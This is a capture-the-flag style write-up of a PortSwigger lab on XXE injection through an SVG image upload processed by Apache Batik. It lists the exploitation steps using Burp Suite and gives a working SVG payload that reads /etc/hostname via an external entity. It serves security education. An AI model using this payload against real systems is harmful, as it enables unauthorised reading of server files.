# PortSwigger Lab: Exploiting XXE via Image File Upload

## Overview

XXE (XML External Entity Injection) is a vulnerability that occurs when XML parsers process external entities defined in the DOCTYPE declaration. This lab demonstrates XXE exploitation through SVG image upload, where the Apache Batik library processes the SVG file and resolves external entities.

## Lab Details

| Attribute | Value |
|-----------|-------|
| **Lab** | Exploiting XXE via image file upload |
| **Difficulty** | Practitioner |
| **Category** | XXE (XML External Entity) |
| **Library** | Apache Batik |
| **Date** | July 19, 2026 |
| **Hostname Found** | `730e06daaa2d` |

---

## Lab Objective

Upload an image that displays the contents of the `/etc/hostname` file after processing, then submit the value of the server hostname.

---

## Screenshots

### Creating the SVG Payload

![Creating SVG Payload](images/01-creating-svg-payload.png)
*Figure 1: Creating the malicious SVG file with XXE payload using nano editor*

### Burp Suite - Intercepting Upload Request

![Burp Suite Intercept](images/02-burp-intercept.png)
*Figure 2: Burp Suite intercepting the POST request to /post/comment*

### Modified Request in Burp Repeater

![Burp Repeater Request](images/03-burp-repeater.png)
*Figure 3: Modified request with avatar.svg and XML payload in Burp Repeater*

### Successful Comment Submission

![Comment Submission Success](images/04-comment-success.png)
*Figure 4: "Thank you for your comment!" response confirming successful upload*

### Extracted Hostname in Avatar

![Hostname in Avatar](images/05-hostname-in-avatar.png)
*Figure 5: Hostname `730e06daaa2d` displayed in the avatar image (visible after zooming in)*

### Lab Solved

![Lab Solved](images/06-lab-solved.png)
*Figure 6: Lab completion notification after submitting the hostname*

---

## Attack Methodology

### Reconnaissance Phase

| Step | Action | Details |
|------|--------|---------|
| 1 | Identify Upload Feature | Blog comment section allows avatar uploads |
| 2 | Determine File Types Accepted | SVG files accepted for avatar images |
| 3 | Identify XML Processing | Apache Batik library processes SVG files |

### Exploitation Phase

| Step | Action | Payload/Command |
|------|--------|-----------------|
| 1 | Create SVG Payload | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` |
| 2 | Upload Malicious File | Select `avatar.svg` as avatar |
| 3 | Intercept with Burp | Capture POST request to `/post/comment` |
| 4 | Modify Request | Change filename to `avatar.svg`, Content-Type to `image/svg+xml` |
| 5 | View Result | Check avatar image for hostname |
| 6 | Submit Solution | Enter hostname in "Submit solution" button |

---

## Core Concepts

### SVG as XML Vector

| Concept | Description |
|---------|-------------|
| **SVG Structure** | SVG (Scalable Vector Graphics) is an XML-based vector image format |
| **Parser** | Apache Batik is a Java-based SVG toolkit that processes SVG files |
| **Vulnerability** | Batik resolves external entities by default, enabling XXE attacks |

### XML Entity Types

| Type | Syntax | Description |
|------|--------|-------------|
| Internal Entity | `<!ENTITY name "value">` | Defined and used within the same XML document |
| External Entity | `<!ENTITY name SYSTEM "URI">` | Reference external resources using URIs |
| DOCTYPE Declaration | `<!DOCTYPE root [<!ENTITY name SYSTEM "file:///path">]>` | Defines document type and entity declarations |

---

## Attack Payloads

### Basic Payload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
